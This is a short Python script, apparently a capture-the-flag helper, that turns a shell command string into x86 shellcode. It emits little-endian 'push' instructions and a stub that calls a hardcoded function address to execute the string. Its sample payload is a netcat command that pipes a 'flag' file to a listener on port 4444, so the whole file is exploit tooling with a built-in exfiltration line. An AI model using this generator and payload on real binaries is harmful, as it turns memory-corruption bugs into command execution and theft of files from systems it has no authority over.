intro="""
----------------------------------
Convert String to Shellcode
thai 1412
----------------------------------
"""

call="""
push esp
mov eax, 0x0804823f
add eax,0x101
call eax

--------------Step2:
https://defuse.ca/online-x86-assembler.htm#disassembly
"""

def text2hex(s):
    return "".join([hex(ord(i)) for i in s]).replace("0x",'')

def convert2_4byte(s):
    l=[]
    if len(s)%2==0:
        for i in range(0,len(s),8):
            ss=s[i:i+8]+"0"*(8-len(s[i:i+8]))
            l.append(ss)
    return l[::-1]

def littleIdian(ss):
    l=[]
    for i in range(0,len(ss),2):
        l.append(ss[i:i+2])
    return "".join(l[::-1])

print intro



s="nc 127.0.0.1 4444 <flag "
def run(s):
    print "\nText\n",s
    p=text2hex(s)
    print "\n--------------Step1:\nConvert to Hex:\n",p
    pp=convert2_4byte(p)
    s_new=""
    s_new+="\npush 0x".join([littleIdian(i) for i in pp])
    s_new="push 0x"+s_new
    print "\nConvert to Assembly:\n",s_new
    print call

run(s)
        
